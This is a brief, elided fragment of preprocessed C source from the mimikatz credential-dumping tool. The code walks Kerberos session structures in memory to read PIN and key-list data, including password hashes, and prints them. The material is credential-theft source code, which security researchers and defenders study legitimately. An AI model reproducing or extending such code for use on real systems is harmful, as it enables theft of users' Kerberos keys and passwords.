# 1 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimilib/sekurlsadbg/kuhl_m_sekurlsa_packages.c"
   ...
   if(ReadMemory(ptr, data, (ULONG) kerbHelper[KerbOffsetIndex].structSize, NULL))
   {
    ...
    if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetPin))
     ...
     if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList))
      if(ReadMemory(ptr, &keyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6) , NULL))
      {
       ...
       {
        if(ReadMemory(ptr + sizeof(KIWI_KERBEROS_KEYS_LIST_6) , pHashPassword, i, NULL))
        {
         dprintf("\n\t * Key List\n");
